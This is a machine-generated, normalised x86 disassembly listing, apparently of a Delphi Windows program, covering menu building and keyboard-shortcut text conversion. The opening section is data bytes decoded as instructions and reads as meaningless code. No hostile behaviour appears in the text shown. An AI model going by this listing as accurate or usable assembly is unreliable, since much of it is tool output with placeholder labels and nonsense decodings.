jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jo r-xdata
inc ebx
push 0x65676e61
inc esp
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4c65646f
jg r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al cl
pop edi
outsb
and [ ebp + 0x45 ] dh
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
ja r-xdata
add [ ebp ] 0xec
jl r-xdata
jo r-xdata
je r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi + eax * 4 ] ah
inc ecx
add al cl
mov [ ecx ] al
or [ ebx - 0x7887ffbf ] cl
inc ecx
add ah dh
xchg [ ecx ] eax
sbb bh cl
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 ] dl
inc ebp
add [ eax + eax ] dl
add [ eax ] al
enter 0x415f 0x0
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc ebp
add [ eax ] cl
add [ eax ] al
add [ esp + ebx * 4 + 0x35980042 ] ah
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ah
popfd
je r-xdata
rol [ eax ] 0x83
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edx
add [ eax - 0x62 ] cl
inc edx
add [ eax ] ch
sahf
inc edx
add [ esi + ebx * 4 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
in al 0x9d
imul esi [ ebx + 0x74 ] 0x45836c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7d ] bh
jne r-xdata
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + edi * 2 + 0x45 ] cl
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
test ebx ebx
je r-xdata
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
adc al 0x77
inc ebp
add [ edi + edi * 2 ] cl
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44d0a0
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_4583b8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_447804
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44d0a0
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_458410
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_458448
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404164
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4043d4
sub_45849c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_458685
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041fc
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40434c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041fc
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041fc
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40434c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40434c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404164
mov eax esi
call sub_404164
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4041fc
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408350
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404470
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_458448
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40442c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041fc
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40442c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40442c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40442c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45868c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404188
retn
sub_4586a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404424
push eax
mov eax edi
call sub_404424
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404424
push eax
mov eax edi
call sub_404624
push eax
mov eax [ esi ]
call sub_404624
pop edx
pop ecx
call sub_408230
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404424
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4046c4
sub_4586fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_4587d7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4586a0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4586a0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4586a0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4586a0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587de
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45849c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4081e0
test eax eax
jne r-xdata
sub_458814
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45adb4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45adc4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_458874
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45adb4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45adb4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45adc4
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45adc4
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_458814
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_458814
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45adc4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45adc4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_4589c0
push ebx
mov ebx eax
mov eax ebx
call sub_455568
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45d8d0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4589f8
push ebx
mov ebx eax
mov eax ebx
call sub_45557c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458a28
push ebx
mov ebx eax
mov eax ebx
call sub_455590
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458a58
push ebx
mov ebx eax
mov eax ebx
call sub_4555b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458a88
push ebx
mov ebx eax
mov eax ebx
call sub_4555e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404570
je r-xdata
mov al 0x1
pop ebx
retn
sub_458abc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4555a4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_458af8
push ebx
mov ebx eax
mov eax ebx
call sub_4555f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458b2c
push ebx
mov ebx eax
mov eax ebx
call sub_455608
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458b60
push ebx
mov ebx eax
mov eax ebx
call sub_45561c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458b94
push ebx
mov ebx eax
mov eax ebx
call sub_421a74
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458bbc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_458bdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45ac1c
sub_458bfc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45ac8c
sub_458c1c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45ace0
sub_458c3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_458c58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_4041b8
sub_458c7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45ae0c
sub_458c9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45ade8
sub_458cbc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45adfc
sub_458cdc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_458d08
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421184
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_4587f4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45b718
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_458d84
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45d6b4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45adb4
test eax eax
jg r-xdata
mov edx esi
call sub_45b14c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45adc4
call sub_403368
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403368
lea eax [ esi + 0x44 ]
call sub_40d490
lea eax [ esi + 0x78 ]
call sub_40d490
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4591a0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418dcc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
call sub_403368
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_458e38
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459093
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45909a
lea eax [ ebp - 0x40 ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404164
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4041fc
mov eax ebx
call sub_45adb4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_459348
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404570
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45adb4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45b370
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45849c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4044e4
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404624
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404624
push eax
mov eax ebx
call sub_459348
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45a98c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404570
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404624
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45adb4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_459348
mov [ ebp - 0x25 ] eax
sub_4590b3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_458e38
xor eax eax
pop ebp
retn
sub_4590d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45c9ac
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b974
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45be70
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_458874
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_459148
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_459192
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41dba8
mov eax [ ebp - 0x4 ]
call sub_4586fc
mov edx eax
mov eax ebx
call sub_45ade8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459199
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4591a0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_459218
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_421254
sub_4591dc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4215d4
mov eax ebx
call sub_45ad9c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45ad9c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403564
pop esi
pop ebx
retn
mov eax ebx
call sub_459218
sub_459218
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_459348
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_459218
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_459348
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_459348
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_4590d8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebp
call sub_459348
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4592e8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
